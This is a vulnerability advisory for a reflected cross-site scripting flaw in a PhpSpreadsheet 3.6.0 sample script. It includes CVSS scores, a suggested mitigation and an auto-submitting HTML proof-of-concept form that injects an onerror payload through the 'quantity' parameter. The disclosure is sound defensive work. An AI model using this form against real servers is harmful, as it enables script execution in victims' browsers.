summary: "PhpSpreadsheet allows unauthorized Reflected XSS in `Convert-Online.php` file\n# Unauthorized\
  \ Reflected XSS in `Convert-Online.php` file\n**Product**: Phpspreadsheet\n**Version**: version\
  \ 3.6.0\n**CWE-ID**: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site\
  \ Scripting')\n**CVSS vector v.3.1**: 8.2 (AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:H/A:N)\n**CVSS vector\
  \ v.4.0**: 8.3 (AV:N/AC:L/AT:N/PR:N/UI:A/VC:N/VI:H/VA:N/SC:L/SI:H/SA:L)\n**Description**:\
  \ using the `/vendor/phpoffice/phpspreadsheet/samples/Engineering/Convert-Online.php` script,\
  \ an attacker can perform a XSS-type attack \n**Impact**: executing arbitrary JavaScript code\
  \ in the browser\n**Vulnerable component**: the `/vendor/phpoffice/phpspreadsheet/samples/Engineering/Convert-Online.php`\
  \ file\n**Exploitation conditions**: an unauthorized user\n**Mitigation**: sanitization of\
  \ the quantity variable\n**Researcher**: Aleksey Solovev (Positive Technologies)\n\n# Research\n\
  \nThe researcher discovered zero-day vulnerability Unauthorized Reflected Cross-Site Scripting\
  \ (XSS) (in `Convert-Online.php` file) in Phpspreadsheet.\n\nThere is no sanitization in the\
  \ `/vendor/phpoffice/phpspreadsheet/samples/Engineering/Convert-Online.php` file, which leads\
  \ to the possibility of a XSS attack.\n\n![fig4](https://github.com/user-attachments/assets/71a6ab8b-db65-4e7e-bb36-39f0bd0f7077)\n\
  \n*Figure 4. The message with the quantity parameter is displayed without sanitization*\n\n\
  \nThe following figure shows a POST HTTP-request and a response to the server with the variable\
  \ quantity, which is displayed in the response from the server without sanitization.\n\n<img\
  \ width=\"460\" alt=\"fig5\" src=\"https://github.com/user-attachments/assets/022323c9-ca1e-44ea-9380-37ed7848e971\"\
  \ />\n\n*Figure 5. In the server's response , the quantity variable is displayed without sanitization*\n\
  \nAn attacker can prepare a special HTML form that will be automatically sent to the vulnerable\
  \ scenario.\n\n*Listing 3. HTML form that demonstrates the exploitation of the XSS vulnerability*\n\
  \n```\n<html>\n  <!-- CSRF PoC - generated by Burp Suite Professional -->\n  <body>\n    <form\
  \ action=\"https://192.***.***.***/vendor/phpoffice/phpspreadsheet/samples/Engineering/Convert-Online.php\"\
  \ method=\"POST\">\n      <input type=\"hidden\" name=\"category\" value=\"Weight&#32;and&#32;Mass\"\
  \ />\n      <input type=\"hidden\" name=\"quantity\" value=\"1&#46;0&lt;img&#32;src&#61;1&#32;onerror&#61;alert&#40;&#41;&gt;\"\
  \ />\n      <input type=\"hidden\" name=\"fromUnit\" value=\"g\" />\n      <input type=\"\
  hidden\" name=\"toUnit\" value=\"g\" />\n      <input type=\"hidden\" name=\"submitx\" value=\"\
  Convert\" />\n      <input type=\"submit\" value=\"Submit request\" />\n    </form>\n    <script>\n\
  \      history.pushState('', '', '/');\n      document.forms[0].submit();\n    </script>\n\
  \  </body>\n</html>\n```\n\nAfter the user visits the attacker's resource, the form will be\
  \ sent to the vulnerable scenario, which will lead to the execution of arbitrary code in the\
  \ client's browser.\n \n<img width=\"389\" alt=\"fig6\" src=\"https://github.com/user-attachments/assets/e52b68c6-5a98-4db2-85ec-5bf37e4cb625\"\
  \ />\n\n*Figure 6. Executing arbitrary JavaScript code*\n\n\n# Credit\nThis vulnerability\
  \ was discovered by **Aleksey Solovev (Positive Technologies)**"
